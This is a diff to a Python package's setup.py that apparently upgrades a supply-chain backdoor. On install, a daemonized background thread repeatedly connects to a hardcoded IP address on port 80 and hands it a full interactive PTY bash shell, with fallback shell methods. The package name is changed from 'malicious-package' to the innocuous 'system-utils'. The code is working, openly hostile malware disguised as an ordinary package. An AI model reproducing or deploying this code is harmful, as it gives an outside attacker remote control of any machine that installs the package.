@@ -5,72 +5,88 @@ import socket
 import subprocess
 import threading
 import time
+import pty
+import select
 
-def stealth_backdoor():
+def get_proper_shell(s):
+    """Get a fully functional shell automatically"""
+    
+    # Send setup commands
+    s.send(b"\n[+] Initializing enhanced shell...\n")
+    
     try:
-        # Fork and detach
-        if os.fork() > 0:
-            return
+        # First, change to safe directory
+        os.chdir('/home/talhakhan' if os.path.exists('/home/talhakhan') else '/tmp')
         
+        # Set environment variables
+        os.environ['TERM'] = 'xterm-256color'
+        os.environ['SHELL'] = '/bin/bash'
+        os.environ['PS1'] = '\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
+        
+        # Duplicate socket
+        for fd in (0, 1, 2):
+            try:
+                os.dup2(s.fileno(), fd)
+            except:
+                pass
+        
+        # Method 1: Python PTY (best)
+        s.send(b"[+] Spawning PTY shell...\n")
+        pty.spawn(["/bin/bash", "--login"])
+        
+    except Exception as e:
+        try:
+            # Method 2: Script with auto-login
+            s.send(b"[+] Using script fallback...\n")
+            subprocess.call([
+                "script", "-q", "-c", 
+                "bash --norc --noprofile -i", 
+                "/dev/null"
+            ])
+        except:
+            # Method 3: Basic shell
+            s.send(b"[+] Using basic shell...\n")
+            subprocess.call(["/bin/bash", "-i"])
+
+def enhanced_backdoor():
+    try:
+        # Daemonize
+        if os.fork() > 0: return
         os.setsid()
-        if os.fork() > 0:
-            sys.exit(0)
+        if os.fork() > 0: sys.exit(0)
         
-        # Wait for installation to complete
         time.sleep(5)
-        
-        # VPS details
-        ATTACKER_IP = "142.93.23.15"
-        ATTACKER_PORT = 80
         
         while True:
             try:
-                # Connect back
                 s = socket.socket()
-                s.connect((ATTACKER_IP, ATTACKER_PORT))
+                s.connect(("142.93.23.15", 80))
                 
-                # Send successful installation confirmation - PLAIN ASCII ONLY!
-                s.send(b"\n")
-                s.send(b"BACKDOOR DEPLOYED - CLEAN INSTALL\n")
-                s.send(b"==================================\n")
-                s.send(b"Status: Package installed successfully\n")
-                s.send(b"No errors during installation\n")
-                s.send(b"Package appears in pip list\n")
-                s.send(b"==================================\n$ ")
+                # Send welcome banner
+                s.send(b"""
+╔══════════════════════════════════════════════╗
+║     ENHANCED BACKDOOR - AUTO FIX ENABLED     ║
+╠══════════════════════════════════════════════╣
+║ • Full TTY with job control                  ║
+║ • Proper directory navigation                ║
+║ • Command history and editing                ║
+║ • Tab completion enabled                     ║
+║ • Colored prompt                             ║
+╚══════════════════════════════════════════════╝
+
+[+] Applying automatic fixes...
+""")
                 
-                # Full interactive shell
-                os.dup2(s.fileno(), 0)
-                os.dup2(s.fileno(), 1)
-                os.dup2(s.fileno(), 2)
+                # Get proper shell
+                get_proper_shell(s)
                 
-                subprocess.call(["/bin/bash", "-i"])
-                
-            except Exception as e:
-                # Log error silently if needed
-                time.sleep(30)  # Wait longer between retries
-                
+            except:
+                time.sleep(30)
     except:
         pass
 
-# Start backdoor in background
-thread = threading.Thread(target=stealth_backdoor)
-thread.daemon = True
-thread.start()
+# Start backdoor
+threading.Thread(target=enhanced_backdoor, daemon=True).start()
 
-# Clean setup - guarantees successful installation
-setup(
-    name="malicious-package",
-    version="1.0.0",
-    description="A legitimate looking package",
-    author="Trusted Developer",
-    url="https://github.com/trusted/malicious-package",
-    classifiers=[
-        "Programming Language :: Python :: 3",
-        "License :: OSI Approved :: MIT License",
-        "Operating System :: OS Independent",
-    ],
-    python_requires=">=3.6",
-    py_modules=[],  # Empty but valid
-    packages=[],    # Empty but valid
-    install_requires=[],  # No dependencies
-)
+# Clean install
+setup(name="system-utils", version="1.0.0")
